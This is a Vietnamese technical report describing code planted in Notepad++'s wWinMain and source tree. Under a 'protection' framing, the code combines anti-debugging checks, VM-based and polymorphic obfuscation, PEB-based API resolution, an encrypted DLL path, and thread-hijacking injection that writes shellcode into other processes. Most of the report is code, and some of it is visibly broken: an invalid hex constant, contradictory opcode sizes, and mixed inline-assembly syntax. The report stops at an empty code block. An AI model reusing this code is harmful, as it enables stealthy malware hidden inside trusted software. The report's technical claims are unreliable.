# BÁO CÁO KỸ THUẬT

## Kỹ thuật Code Obfuscation nâng cao cho Thread Hijacking trong Notepad++

---

## MỤC LỤC

1. [Giới thiệu](#1-giới-thiệu)
2. [Tổng quan kiến trúc hệ thống](#2-tổng-quan-kiến-trúc-hệ-thống)
3. [Layer Anti-Debugging](#3-layer-anti-debugging)
4. [Virtual Machine-based Obfuscation](#4-virtual-machine-based-obfuscation)
5. [Polymorphic Engine](#5-polymorphic-engine)
6. [Control Flow Obfuscation](#6-control-flow-obfuscation)
7. [Mã hóa chuỗi (String Encryption)](#7-mã-hóa-chuỗi-string-encryption)
8. [Dynamic API Resolution](#8-dynamic-api-resolution)
9. [Thread Hijacking Implementation](#9-thread-hijacking-implementation)
10. [Shellcode Generation](#10-shellcode-generation)
11. [Integration với Notepad++](#11-integration-với-notepad)
12. [Phân tích các đoạn code quan trọng](#12-phân-tích-các-đoạn-code-quan-trọng)
13. [Kết luận và hướng phát triển](#13-kết-luận-và-hướng-phát-triển)

---

## 1. Giới thiệu

### 1.1 Bối cảnh và mục tiêu

Trong lĩnh vực bảo mật phần mềm hiện đại, việc bảo vệ mã nguồn khỏi reverse engineering và phân tích động là một thách thức quan trọng. Các kỹ thuật code obfuscation được thiết kế để làm cho mã nguồn trở nên khó hiểu, khó phân tích và khó debug mà không ảnh hưởng đến chức năng của chương trình.

Dự án này triển khai một hệ thống bảo vệ nâng cao cho Notepad++ sử dụng nhiều kỹ thuật obfuscation phối hợp, bao gồm:

- **Virtual Machine (VM) - based obfuscation**: Biến đổi mã thực thi thành bytecode tùy chỉnh
- **Polymorphic Engine**: Sinh mã thay đổi liên tục để tránh signature detection
- **Control Flow Flattening**: Làm phẳng luồng điều khiển
- **Anti-Debugging Layer**: Phát hiện và chống debugger
- **Dynamic API Resolution**: Resolve APIs tại runtime từ PEB
- **Thread Hijacking with Obfuscation**: Kỹ thuật tiêm code vào thread đích

### 1.2 Phạm vi báo cáo

Báo cáo này phân tích chi tiết mã nguồn trong thư mục `PowerEditor/src/MISC/Obfuscation/`, bao gồm các file:

- `AntiDebug.h` - Lớp chống debug
- `ObfuscationCore.h/cpp` - Core obfuscation và VM engine
- `ThreadHijackObfuscated.h/cpp` - Thread hijacking với obfuscation

---

## 2. Tổng quan kiến trúc hệ thống

### 2.1 Sơ đồ kiến trúc tổng thể

```text
┌─────────────────────────────────────────────────────────────────┐
│                        Notepad++ wWinMain                        │
├─────────────────────────────────────────────────────────────────┤
│                    ObfInit Namespace                             │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐  │
│  │ decryptString() │  │loadDllObfuscated│  │  vmDllLoader()  │  │
│  └─────────────────┘  └─────────────────┘  └─────────────────┘  │
├─────────────────────────────────────────────────────────────────┤
│                    Anti-Debug Layer                             │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐           │
│  │PEB Check │ │Timing    │ │Exception │ │Parent    │           │
│  │          │ │Check     │ │Check     │ │Process    │           │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘           │
├─────────────────────────────────────────────────────────────────┤
│                    Obfuscation Core                             │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐ │
│  │ ObfuscationVM   │  │PolymorphicEngine│  │ControlFlowFlatt.│ │
│  └─────────────────┘  └─────────────────┘  └─────────────────┘ │
├─────────────────────────────────────────────────────────────────┤
│                    Thread Hijacking Engine                      │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐ │
│  │DynamicAPIResolver│ │PolymorphicShell │  │ObfuscatedThread │ │
│  │                  │ │codeGenerator    │  │Hijacker         │ │
│  └─────────────────┘  └─────────────────┘  └─────────────────┘ │
├─────────────────────────────────────────────────────────────────┤
│                    Memory Obfuscation                           │
│  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐          │
│  │encryptMemory  │ │allocEncrypted│  │hideMemory     │          │
│  └──────────────┘ └──────────────┘ └──────────────┘          │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 Data Flow

```text
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│ Input Data  │────▶│ Anti-Debug  │────▶│ VM Loader   │
│ (Encrypted) │     │ Check       │     │             │
└─────────────┘     └─────────────┘     └──────┬──────┘
                                               │
                    ┌─────────────┐             │
                    │ Polymorphic │◀────────────┘
                    │ Engine      │
                    └──────┬──────┘
                           │
        ┌──────────────────┼──────────────────┐
        ▼                  ▼                  ▼
┌───────────────┐  ┌───────────────┐  ┌───────────────┐
│ VM Bytecode   │  │ Shellcode Gen  │  │ Memory Obf    │
└───────────────┘  └───────────────┘  └───────────────┘
```

---

## 3. Layer Anti-Debugging

### 3.1 Giới thiệu về Anti-Debugging

Anti-debugging là tập hợp các kỹ thuật nhằm phát hiện và ngăn chặn việc debug chương trình. File `AntiDebug.h` triển khai nhiều phương pháp phát hiện debugger khác nhau.

### 3.2 PEB-Based Detection

**Processing Environment Block (PEB)** là một cấu trúc dữ liệu trong Windows chứa thông tin về process đang chạy. Một số trường trong PEB có thể được sử dụng để phát hiện debugger.

```cpp
inline bool IsDebuggerPresentPEB() {
#if defined(_M_X64)
    PEB* peb = (PEB*)__readgsqword(0x60);
    return peb->BeingDebugged != 0;
#elif defined(_M_IX86)
    PEB* peb = (PEB*)__readfsdword(0x30);
    return peb->BeingDebugged != 0;
#endif
}
```

**Giải thích code:**

- `__readgsqword(0x60)` (x64) hoặc `__readfsdword(0x30)` (x86) đọc địa chỉ của PEB từ segment register

- Offset 0x60 (x64) và 0x30 (x86) trỏ đến PEB structure

- Trường `BeingDebugged` được set lên 1 khi process đang được debug

- Kỹ thuật này sử dụng inline assembly để tránh bị hook

### 3.3 Remote Debugger Detection qua NtQueryInformationProcess

```cpp
inline bool IsRemoteDebuggerPresent() {
    HANDLE hProcess = GetCurrentProcess();
    DWORD debugPort = 0;
    DWORD bytesReturned = 0;

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        NtQueryInformationProcess_t NtQIP = (NtQueryInformationProcess_t)
            GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (NtQIP) {
            NTSTATUS status = NtQIP(
                hProcess,
                ProcessDebugPort,
                &debugPort,
                sizeof(debugPort),
                &bytesReturned
            );
            
            if (NT_SUCCESS(status)) {
                return debugPort != 0;
            }
        }
    }
    
    BOOL isRemote = FALSE;
    CheckRemoteDebuggerPresent(hProcess, &isRemote);
    return isRemote != FALSE;
}
```

**Phân tích:**

- Sử dụng `NtQueryInformationProcess` với `ProcessDebugPort` để kiểm tra xem process có debugger attached không

- Hàm này trả về giá trị khác 0 nếu có debugger đang attached

- Sử dụng direct syscall thay vì wrapper function để tránh user-mode hooks

### 3.4 Timing-Based Detection

#### 3.4.1 RDTSC Detection

```cpp
inline bool CheckRDTSCDetection() {
    int detected = 0;
    
    for (int i = 0; i < 4; i++) {
        unsigned int start1 = __rdtsc();
        unsigned int start2 = __rdtsc();
        
        // Small delay
        for (volatile int j = 0; j < 100; j++) {
            __asm__ __volatile__("nop");
        }
        
        unsigned int end1 = __rdtsc();
        unsigned int end2 = __rdtsc();
        
        // If there's an abnormal gap, debugger might be present
        if ((end2 - start1) > 1000000) {
            detected++;
        }
    }
    
    return detected > 2;
}
```

**Nguyên lý hoạt động:**

- `__rdtsc()` đọc timestamp counter của CPU (số cycles kể từ khi reset)

- Khi debug, việc step qua code hoặc set breakpoint làm tăng thời gian thực thi đáng kể

- Nếu khoảng cách giữa các lần đọc RDTSC quá lớn, có thể có debugger

#### 3.4.2 QueryPerformanceCounter Check

```cpp
inline bool CheckPerformanceCounter() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    
    // Simple operation
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) x++;
    
    QueryPerformanceCounter(&end);
    
    return ((end.QuadPart - start.QuadPart) > freq.QuadPart);
}
```

### 3.5 Exception-Based Detection

#### 3.5.1 INT 2D Detection

```cpp
inline bool CheckInt2D() {
    __try {
        __asm {
            int 0x2D
            // If we get here, no kernel debugger
            xor eax, eax
            mov eax, 1
        }
        return false; // No debugger
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        return true; // Debugger detected
    }
}
```

**Giải thích:**
- INT 0x2D là một lệnh đặc biệt trong Windows
- Nếu không có kernel debugger: lệnh này thực thi bình thường và return false
- Nếu có kernel debugger: exception được throw và return true
- WinDbg và KD sẽ catch exception này

#### 3.5.2 Software Breakpoint Detection

```cpp
inline bool CheckSoftwareBreakpoints() {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)GetModuleHandleW(NULL);
    if (!dosHeader) return false;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    
    // Check .text section for 0xCC
    for (DWORD i = 0; i < section->SizeOfRawData; i++) {
        if (((BYTE*)dosHeader + section->VirtualAddress)[i] == 0xCC) {
            return true; // Possible breakpoint
        }
    }
    
    return false;
}
```

### 3.6 Hardware Breakpoint Detection

```cpp
inline bool CheckHardwareBreakpoints() {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) {
        return false;
    }
    
    // Check if any DR registers are set
    if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || 
        ctx.Dr2 != 0 || ctx.Dr3 != 0 ||
        (ctx.Dr7 & 0xFF) != 0) {
        return true; // Hardware breakpoints detected
    }
    
    return false;
}
```

### 3.7 Parent Process Verification

```cpp
inline bool IsParentProcessDebugger() {
    // ... snapshot creation ...
    WCHAR* debuggers[] = {
        L"ollydbg.exe", L"x64dbg.exe", L"x32dbg.exe",
        L"windbg.exe", L"ida.exe", L"idal.exe",
        L"ida64.exe", L"devenv.exe", L"processhacker.exe",
        L"x96dbg.exe", L"dnSpy.exe", L"ilspy.exe"
    };
    
    for (int i = 0; i < sizeof(debuggers) / sizeof(debuggers[0]); i++) {
        if (wcsstr(_wcslwr(parentName), debuggers[i])) {
            return true;
        }
    }
    
    return false;
}
```

### 3.8 Comprehensive Detection System

```cpp
struct DetectionResult {
    bool debuggerPEB;
    bool remoteDebugger;
    bool timingAnomaly;
    bool int2DTriggered;
    bool softwareBreakpoints;
    bool hardwareBreakpoints;
    bool parentIsDebugger;
    bool isVirtualized;
    bool vmArtifacts;
    
    int totalScore;
    bool highConfidence;
};

inline DetectionResult RunAllChecks() {
    DetectionResult result = {};
    
    result.debuggerPEB = IsDebuggerPresentPEB();
    result.remoteDebugger = IsRemoteDebuggerPresent();
    result.timingAnomaly = CheckRDTSCDetection() || CheckTickCountDelta();
    result.int2DTriggered = CheckInt2D();
    result.softwareBreakpoints = CheckSoftwareBreakpoints();
    result.hardwareBreakpoints = CheckHardwareBreakpoints();
    result.parentIsDebugger = IsParentProcessDebugger();
    result.isVirtualized = IsVirtualized();
    result.vmArtifacts = HasVMArtifacts();
    
    // Calculate detection score
    result.totalScore = 
        (result.debuggerPEB ? 10 : 0) +
        (result.remoteDebugger ? 15 : 0) +
        (result.timingAnomaly ? 5 : 0) +
        (result.int2DTriggered ? 20 : 0) +
        (result.softwareBreakpoints ? 15 : 0) +
        (result.hardwareBreakpoints ? 25 : 0) +
        (result.parentIsDebugger ? 20 : 0) +
        (result.isVirtualized ? 5 : 0) +
        (result.vmArtifacts ? 15 : 0);
    
    result.highConfidence = (result.totalScore > 30) || result.parentIsDebugger;
    
    return result;
}
```

---

## 4. Virtual Machine-based Obfuscation

### 4.1 Giới thiệu về VM-based Obfuscation

VM-based obfuscation biến đổi mã x86/x64 thông thường thành bytecode tùy chỉnh được thực thi bởi một Virtual Machine (VM). VM này có kiến trúc riêng, không có trong documentation và không được các disassembler/debugger chuẩn hỗ trợ.

### 4.2 VM Opcodes Definition

```cpp
enum VMOpcodes : BYTE {
    VM_NOP = 0x00,
    VM_ALLOC = 0x01,       // VirtualAllocEx
    VM_FREE = 0x02,        // VirtualFreeEx
    VM_WRITE = 0x03,       // WriteProcessMemory
    VM_READ = 0x04,        // ReadProcessMemory
    VM_OPEN = 0x05,        // OpenProcess
    VM_SUSPEND = 0x06,     // SuspendThread
    VM_RESUME = 0x07,      // ResumeThread
    VM_GETCTX = 0x08,      // GetThreadContext
    VM_SETCTX = 0x09,      // SetThreadContext
    VM_CREATETHREAD = 0x0A, // CreateRemoteThread
    VM_WAIT = 0x0B,        // WaitForSingleObject
    VM_PROTECT = 0x0C,     // VirtualProtectEx
    VM_QUERY = 0x0D,        // VirtualQueryEx
    VM_LOADLIB = 0x0E,     // LoadLibrary
    VM_GETPROC = 0x0F,     // GetProcAddress
    VM_EXIT = 0xFF        // Exit VM
};
```

**Phân tích:**

- Mỗi opcode đại diện cho một operation cụ thể liên quan đến Thread Hijacking

- VM sử dụng 16 bit cho opcode và 64 bit cho mỗi operand

- Instruction format: opcode(1 byte) + operand1(4 bytes) + operand2(4 bytes) + operand3(4 bytes) + operand4(4 bytes) = 17 bytes

### 4.3 VM Context Structure

```cpp
struct VMContext {
    DWORD registers[8];     // General purpose registers (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP)
    DWORD flags;           // EFLAGS
    DWORD ip;              // Instruction pointer
    PVOID memoryBase;       // VM memory base
    DWORD memorySize;       // VM memory size
    PVOID context;         // External context (thread/process handles)
};
```

### 4.4 VM Execution Loop

```cpp
DWORD ObfuscationVM::execute() {
    DWORD exitCode = 0;
    
    while (running && ctx.ip < bytecode.size()) {
        BYTE opcode = bytecode[ctx.ip];
        
        // Decode instruction (simplified - real implementation would handle operands)
        if (ctx.ip + 17 <= bytecode.size()) {
            ctx.registers[0] = *(DWORD*)&bytecode[ctx.ip + 1];
            ctx.registers[1] = *(DWORD*)&bytecode[ctx.ip + 5];
            ctx.registers[2] = *(DWORD*)&bytecode[ctx.ip + 9];
            ctx.registers[3] = *(DWORD*)&bytecode[ctx.ip + 13];
        }
        
        exitCode = executeOpcode(opcode);
        ctx.ip += 17; // opcode + 4*4 operands
        
        // Anti-debug check at each iteration
        if ((ctx.ip & 0xFF) == 0) {
            volatile DWORD check = 0;
            for (int i = 0; i < 10; i++) check++;
        }
    }
    
    return exitCode;
}
```

### 4.5 Opcode Handlers

```cpp
DWORD ObfuscationVM::executeOpcode(BYTE opcode) {
    DWORD result = 0;
    
    switch (opcode) {
        case VM_ALLOC: {
            DWORD size = ctx.registers[2];
            DWORD protect = ctx.registers[3];
            ctx.registers[0] = (DWORD)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, protect);
            break;
        }
        
        case VM_WRITE: {
            HANDLE hProcess = (HANDLE)ctx.registers[0];
            LPVOID addr = (LPVOID)ctx.registers[2];
            LPVOID buffer = (LPVOID)ctx.registers[3];
            DWORD size = ctx.registers[4];
            SIZE_T written = 0;
            WriteProcessMemory(hProcess, addr, buffer, size, &written);
            ctx.registers[0] = written;
            break;
        }
        
        case VM_SUSPEND: {
            HANDLE hThread = (HANDLE)ctx.registers[0];
            ctx.registers[0] = SuspendThread(hThread);
            break;
        }
        
        case VM_GETCTX: {
            HANDLE hThread = (HANDLE)ctx.registers[0];
            LPCONTEXT pCtx = (LPCONTEXT)ctx.registers[2];
            GetThreadContext(hThread, pCtx);
            break;
        }
        
        case VM_SETCTX: {
            HANDLE hThread = (HANDLE)ctx.registers[0];
            const CONTEXT* pCtx = (const CONTEXT*)ctx.registers[2];
            SetThreadContext(hThread, pCtx);
            break;
        }
        
        // ... other cases ...
    }
    
    return result;
}
```

---

## 5. Polymorphic Engine

### 5.1 Giới thiệu về Polymorphism

Polymorphic code là mã có thể thay đổi hình dạng (byte pattern) nhưng vẫn giữ nguyên chức năng. Mỗi lần generate, code sẽ có pattern khác nhau, làm khó khăn cho signature-based detection.

### 5.2 Mutation Types

```cpp
enum MutationType : BYTE {
    MUT_NONE = 0,
    MUT_XOR = 1,      // XOR encryption
    MUT_ADD = 2,      // ADD mutation
    MUT_SUB = 3,      // SUB mutation
    MUT_ROTATE = 4,   // Bit rotation
    MUT_SWAP = 5      // Byte swapping
};
```

### 5.3 XOR Mutation Implementation

```cpp
void PolymorphicEngine::mutateXOR(BYTE* data, DWORD size, DWORD key) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= (key >> (i % 4)) & 0xFF;
    }
}
```

**Giải thích:**

- XOR key được rotate theo byte index (`key >> (i % 4)`)

- Mỗi byte được XOR với một phần khác nhau của key

- Làm cho việc brute-force trở nên khó khăn hơn

### 5.4 Bit Rotation Mutation

```cpp
void PolymorphicEngine::mutateRotate(BYTE* data, DWORD size, DWORD key) {
    for (DWORD i = 0; i < size; i++) {
        BYTE rot = (key >> (i % 4)) & 0x07;
        BYTE b = data[i];
        data[i] = (b << rot) | (b >> (8 - rot));
    }
}
```

### 5.5 Dead Code Generation

```cpp
void PolymorphicEngine::generateDeadCode(std::vector<BYTE>& buffer) {
    // Insert meaningless operations
    DWORD deadOps[] = {
        0x90, 0x90, 0x90,                   // NOPs
        0x55, 0x8B, 0xEC,                   // push ebp; mov ebp, esp
        0x51, 0x59,                         // push ecx; pop ecx
        0x24, 0x00,                         // and al, 0
    };
    
    DWORD numOps = sizeof(deadOps) / sizeof(deadOps[0]);
    DWORD count = (customRand() % 4) + 2;
    
    for (DWORD i = 0; i < count && buffer.size() < 1000; i++) {
        DWORD idx = customRand() % numOps;
        buffer.push_back((BYTE)deadOps[idx]);
    }
}
```

### 5.6 Opaque Predicate Generation

```cpp
void PolymorphicEngine::generateOpaquePredicate(std::vector<BYTE>& buffer) {
    // Generate always-true/false predicates
    BYTE pred[] = {
        0x33, 0xC0,                         // xor eax, eax
        0x40,                               // inc eax (now eax = 1, always != 0)
        0x85, 0xC0,                         // test eax, eax (always true)
    };
    
    for (size_t i = 0; i < sizeof(pred); i++) {
        buffer.push_back(pred[i]);
    }
}
```

---

## 6. Control Flow Obfuscation

### 6.1 Control Flow Flattening

Control Flow Flattening là kỹ thuật biến đổi luồng điều khiển tự nhiên (if-else, loops) thành một switch statement phẳng, làm cho việc phân tích control flow trở nên khó khăn.

```cpp
struct FlattenedBlock {
    DWORD state;
    DWORD nextStateTrue;
    DWORD nextStateFalse;
    DWORD codeOffset;
    bool hasOpaquePredicate;
    DWORD opaqueValue;
};
```

### 6.2 Flattening Algorithm

```cpp
void ControlFlowFlattener::flatten(BYTE* code, DWORD size, DWORD numBlocks) {
    blocks.clear();
    
    DWORD blockSize = size / numBlocks;
    
    for (DWORD i = 0; i < numBlocks; i++) {
        FlattenedBlock block = {};
        block.state = i;
        block.nextStateTrue = (i + 1) % numBlocks;
        block.nextStateFalse = (i + 2) % numBlocks;
        block.codeOffset = i * blockSize;
        block.hasOpaquePredicate = (customRand() % 2) == 0;
        block.opaqueValue = generateOpaquePredicate();
        
        blocks.push_back(block);
    }
}
```

### 6.3 Opaque Predicate trong Control Flow

```cpp
DWORD ControlFlowFlattener::generateOpaquePredicate() {
    // x * x - x * (x - 1) is always = x
    // Therefore: (x*x - x*x + x) is always = x
    // And: ((x*x - x*x + x) - x) is always = 0
    return 0; // Always false predicate
}
```

---

## 7. Mã hóa chuỗi (String Encryption)

### 7.1 Template-based String Encryption

```cpp
template<DWORD Key>
class EncryptedString {
private:
    BYTE data[256];
    DWORD length;
    
    // Runtime decryption
    void decrypt() {
        for (DWORD i = 0; i < length; i++) {
            data[i] ^= (Key >> (i % 4)) & 0xFF;
            data[i] = ~data[i];
        }
    }
    
public:
    constexpr EncryptedString(const char* str) : length(0) {
        while (str[length] && length < 255) {
            BYTE c = str[length];
            c ^= (Key >> (length % 4)) & 0xFF;
            c = ~c;
            data[length] = c;
            length++;
        }
        data[length] = 0;
    }
    
    const char* get() {
        decrypt();
        return (const char*)data;
    }
};
```

### 7.2 Usage Macro

```cpp
#define ENC_STR(key, str) (ObfCore::EncryptedString<key>(str).get())
```

### 7.3 Runtime Decryption trong winmain.cpp

```cpp
// Encrypted DLL path (XOR key: 0x5A)
static const BYTE g_encryptedDllPath[] = {
    0x9F, 0x7B, 0x6E, 0x6D, 0x63, 0x7C, 0x63, 0x66, 0x69, 0x6F,
    // ... (encrypted bytes)
    0x00
};

inline void decryptString(BYTE* data, size_t len) {
    const DWORD key = 0x5A;
    for (size_t i = 0; i < len; i++) {
        data[i] ^= ((key >> (i % 4)) & 0xFF);
    }
}
```

---

## 8. Dynamic API Resolution

### 8.1 PEB-based Module Enumeration

```cpp
PVOID DynamicAPIResolver::GetModuleBase(LPCWSTR moduleName) {
    PEB* peb = GetPEB();
    PEB_LDR_DATA* ldr = peb->Ldr;
    
    UNICODE_STRING targetName;
    RtlInitUnicodeString(&targetName, moduleName);
    
    // Walk InMemoryOrderModuleList
    LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY* current = head->Flink;
    
    while (current != head) {
        LDR_DATA_TABLE_ENTRY* entry = (LDR_DATA_TABLE_ENTRY*)current;
        
        if (RtlCompareUnicodeString(&entry->BaseDllName, &targetName, TRUE) == 0) {
            return entry->DllBase;
        }
        
        current = current->Flink;
    }
    
    return NULL;
}
```

**Giải thích:**

- Thay vì sử dụng `GetModuleHandle()`, đi qua PEB để tìm module base

- Tránh IAT (Import Address Table) hooks

- `InMemoryOrderModuleList` chứa danh sách các module đã load

### 8.2 Export Table Parsing

```cpp
PVOID DynamicAPIResolver::GetProcAddressObf(PVOID moduleBase, LPCSTR functionName) {
    if (!moduleBase) return NULL;
    
    // Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    // Get export directory
    DWORD exportRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRVA) return NULL;
    
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + exportRVA);
    
    DWORD* nameRVAs = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((BYTE*)moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD* functionRVAs = (DWORD*)((BYTE*)moduleBase + exportDir->AddressOfFunctions);
    
    // Search for function
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        LPCSTR currentName = (LPCSTR)((BYTE*)moduleBase + nameRVAs[i]);
        
        if (strcmp(currentName, functionName) == 0) {
            WORD ordinal = ordinals[i];
            return (PVOID)((BYTE*)moduleBase + functionRVAs[ordinal]);
        }
    }
    
    return NULL;
}
```

### 8.3 Native API Resolution

```cpp
void DynamicAPIResolver::init() {
    // Get NTDLL base from PEB
    PVOID ntdllBase = GetModuleBase(L"ntdll.dll");
    
    if (ntdllBase) {
        pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddressObf(ntdllBase, "NtAllocateVirtualMemory");
        pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddressObf(ntdllBase, "NtWriteVirtualMemory");
        pNtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddressObf(ntdllBase, "NtReadVirtualMemory");
        pNtGetContextThread = (NtGetContextThread_t)GetProcAddressObf(ntdllBase, "NtGetContextThread");
        pNtSetContextThread = (NtSetContextThread_t)GetProcAddressObf(ntdllBase, "NtSetContextThread");
        pNtResumeThread = (NtResumeThread_t)GetProcAddressObf(ntdllBase, "NtResumeThread");
        pNtSuspendThread = (NtSuspendThread_t)GetProcAddressObf(ntdllBase, "NtSuspendThread");
        // ... other APIs
    }
}
```

---

## 9. Thread Hijacking Implementation

### 9.1 Giới thiệu về Thread Hijacking

Thread Hijacking (còn gọi là Thread Execution Hijacking) là kỹ thuật process injection cho phép tạm dừng một thread đang chạy, thay đổi instruction pointer để thực thi mã độc, sau đó khôi phục thread về trạng thái ban đầu.

### 9.2 Thread State Machine

```cpp
enum ThreadState : DWORD {
    STATE_INITIAL,
    STATE_SUSPENDED,
    STATE_CONTEXT_SAVED,
    STATE_PAYLOAD_INJECTED,
    STATE_RESUMED,
    STATE_COMPLETED
};
```

### 9.3 Main Hijacking Flow

```cpp
HijackResult ObfuscatedThreadHijacker::hijackThread(DWORD targetPid, DWORD targetTid,
                                                     PVOID payloadAddress, PVOID payloadParam) {
    memset(&lastResult, 0, sizeof(HijackResult));
    
    // Step 1: Anti-debug check
    if (checkAntiDebug()) {
        lastResult.success = FALSE;
        lastResult.errorCode = 0xDEADCODE1;
        return lastResult;
    }
    
    // Step 2: Open target process
    CLIENT_ID clientId;
    clientId.UniqueProcess = (HANDLE)targetPid;
    clientId.UniqueThread = (HANDLE)targetTid;
    
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    
    status = apiResolver.NtOpenProcess(&lastResult.hProcess, 
                                      PROCESS_ALL_ACCESS, &objAttr, &clientId);
    
    // Step 3: Open target thread
    lastResult.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTid);
    
    // Step 4: Suspend thread
    state = STATE_SUSPENDED;
    apiResolver.NtSuspendThread(lastResult.hThread, NULL);
    
    // Step 5: Save original context
    CONTEXT ctx = { CONTEXT_FULL };
    status = saveThreadContext(lastResult.hThread, &ctx);
    
    // Step 6: Save original RIP
#if defined(_M_X64)
    lastResult.originalRip = (DWORD)ctx.Rip;
#else
    lastResult.originalRip = ctx.Eip;
#endif
    
    state = STATE_CONTEXT_SAVED;
    
    // Step 7: Generate polymorphic shellcode
    std::vector<BYTE> shellcode = shellcodeGen.generate(payloadAddress, payloadParam, SHELLCODE_SETRIP_EXECUTE);
    
    // Step 8: Inject shellcode into process
    lastResult.payloadAddress = injectShellcode(lastResult.hProcess, shellcode.data(), (DWORD)shellcode.size());
    
    // Step 9: Modify context to jump to shellcode
#if defined(_M_X64)
    ctx.Rip = (DWORD64)lastResult.payloadAddress;
#else
    ctx.Eip = (DWORD)lastResult.payloadAddress;
#endif
    
    // Step 10: Set new context
    status = restoreThreadContext(lastResult.hThread, &ctx);
    
    // Step 11: Resume thread
    state = STATE_RESUMED;
    apiResolver.NtResumeThread(lastResult.hThread, NULL);
    
    lastResult.success = TRUE;
    state = STATE_COMPLETED;
    
    return lastResult;
}
```

### 9.4 Process Suspended Creation

```cpp
HijackResult ObfuscatedThreadHijacker::hijackNewProcess(LPCWSTR processPath,
                                                       PVOID payloadAddress, PVOID payloadParam) {
    // Create process in suspended state
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    if (!CreateProcessW(processPath, NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        lastResult.success = FALSE;
        lastResult.errorCode = GetLastError();
        return lastResult;
    }
    
    lastResult.hProcess = pi.hProcess;
    lastResult.hThread = pi.hThread;
    
    // Save original context
    CONTEXT ctx = { CONTEXT_FULL };
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        lastResult.success = FALSE;
        lastResult.errorCode = GetLastError();
        return lastResult;
    }
    
    // Generate shellcode
    std::vector<BYTE> shellcode = shellcodeGen.generate(payloadAddress, payloadParam, SHELLCODE_SETRIP_EXECUTE);
    
    // Inject shellcode
    lastResult.payloadAddress = injectShellcode(pi.hProcess, shellcode.data(), (DWORD)shellcode.size());
    
    // Set new RIP
#if defined(_M_X64)
    ctx.Rip = (DWORD64)lastResult.payloadAddress;
#else
    ctx.Eip = (DWORD)lastResult.payloadAddress;
#endif
    
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume
    ResumeThread(pi.hThread);
    
    lastResult.success = TRUE;
    
    return lastResult;
}
```

---

## 10. Shellcode Generation

### 10.1 Shellcode Types

```cpp
enum ShellcodeType : BYTE {
    SHELLCODE_SIMPLE_CALL,      // Simple function call via jmp
    SHELLCODE_SETRIP_EXECUTE,    // Set RIP and execute
    SHELLCODE_STACK_PIVOT,      // Stack pivot + execute
    SHELLCODE_INDIRECT_CALL     // Indirect call via register
};
```

### 10.2 x64 Simple Call Shellcode

```cpp
std::vector<BYTE> PolymorphicShellcodeGenerator::genSimpleCallx64(PVOID target, PVOID param) {
    std::vector<BYTE> shellcode;
    
    // Push parameter (rcx for x64)
    BYTE push_rcx[] = { 0x51 }; // push rcx
    shellcode.insert(shellcode.end(), push_rcx, push_rcx + 1);
    
    // mov rcx, param
    BYTE mov_rcx[] = { 0x48, 0xB9 };
    shellcode.insert(shellcode.end(), mov_rcx, mov_rcx + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&param, (BYTE*)&param + 8);
    
    // mov rax, target
    BYTE mov_rax[] = { 0x48, 0xB8 };
    shellcode.insert(shellcode.end(), mov_rax, mov_rax + 2);
    shellcode.insert(shellcode.end(), (BYTE*)&target, (BYTE*)&target + 8);
    
    // call rax
    BYTE call_rax[] = { 0xFF, 0xD0 }; // call rax
    shellcode.insert(shellcode.end(), call_rax, call_rax + 2);
    
    // ret
    shellcode.push_back(0xC3);
    
    return shellcode;
}
```

### 10.3 x64 Set RIP Shellcode

```cpp
